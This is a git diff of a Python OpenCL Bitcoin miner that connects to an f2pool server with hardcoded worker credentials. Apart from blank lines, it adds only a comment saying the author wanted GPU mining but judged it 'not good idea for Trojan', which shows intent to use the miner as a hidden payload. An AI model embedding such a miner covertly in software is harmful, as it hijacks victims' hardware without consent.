@@ -8,17 +8,24 @@ import numpy as np
 import os
 import sys
 
+"""
+Wanted to mine BTC by GPU but this is not good idea for Trojan
+"""
+
 # Pool address and port
 POOL_ADDRESS = "btc-euro.f2pool.com"
 POOL_PORT = 1315  # Ensure this is the correct port for the pool
+
 
 # Wallet address and worker name
 USERNAME = "wageta.001"
 PASSWORD = "21235365876986800"
 
+
 # Double SHA-256 hashing function
 def double_sha256(data):
     return hashlib.sha256(hashlib.sha256(data).digest()).digest()
+
 
 # Miner class to manage mining operations
 class Miner:
@@ -52,6 +59,7 @@ class Miner:
         # Build the OpenCL program
         self.build_opencl_program()
 
+
     # Method to receive a line from the pool, handling partial messages
     def recv_line(self):
         while True:
@@ -65,6 +73,7 @@ class Miner:
                 self.recv_buffer += data
             except socket.timeout:
                 continue
+
 
     def build_opencl_program(self):
         # OpenCL kernel code for double SHA-256 hashing
@@ -260,16 +269,19 @@ class Miner:
         # Build the OpenCL program
         self.program = cl.Program(self.ctx, self.kernel_code).build()
 
+
     # Connect to the mining pool
     def connect(self):
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.connect((POOL_ADDRESS, POOL_PORT))
         self.sock.settimeout(5)
 
+
     # Send data to the pool
     def send(self, data):
         message = json.dumps(data).encode('utf-8') + b'\n'
         self.sock.sendall(message)
+
 
     # Authorize with the mining pool
     def authorize(self):
@@ -281,6 +293,7 @@ class Miner:
         self.send(auth_payload)
         response = self.recv_line()
         # Handle authorization response if needed
+
 
     # Subscribe to the mining pool
     def subscribe(self):
@@ -299,6 +312,7 @@ class Miner:
         else:
             raise Exception("Failed to subscribe")
 
+
     # Set new mining job
     def set_job(self, params):
         self.job_id = params[0]
@@ -311,6 +325,7 @@ class Miner:
         self.ntime = params[7]
         # self.clean_jobs = params[8]  # Some pools may not send this parameter
 
+
     # Assemble the coinbase transaction
     def assemble_coinbase(self, extranonce2):
         extranonce2_hex = '{:0{width}x}'.format(extranonce2, width=self.extranonce2_size * 2)
@@ -319,6 +334,7 @@ class Miner:
         coinbase_hash_bin = double_sha256(coinbase_bin)
         return coinbase_hash_bin
 
+
     # Build the Merkle root
     def build_merkle_root(self, coinbase_hash_bin):
         merkle_root = coinbase_hash_bin
@@ -326,6 +342,7 @@ class Miner:
             branch_bin = bytes.fromhex(branch)
             merkle_root = double_sha256(merkle_root + branch_bin)
         return merkle_root
+
 
     # Convert nBits to target
     def nbits_to_target(self, nbits):
@@ -336,6 +353,7 @@ class Miner:
         target_hexstr = '%064x' % target
         target_bin = bytes.fromhex(target_hexstr)
         return target_bin
+
 
     # Main mining loop
     def mine(self):
@@ -465,6 +483,7 @@ class Miner:
             else:
                 time.sleep(1)
 
+
     # Submit a valid share to the pool
     def submit_share(self, nonce, extranonce2_hex):
         submit_payload = {
@@ -485,6 +504,7 @@ class Miner:
             print("Share accepted")
         else:
             print("Share rejected")
+
 
 if __name__ == "__main__":
     miner = Miner()
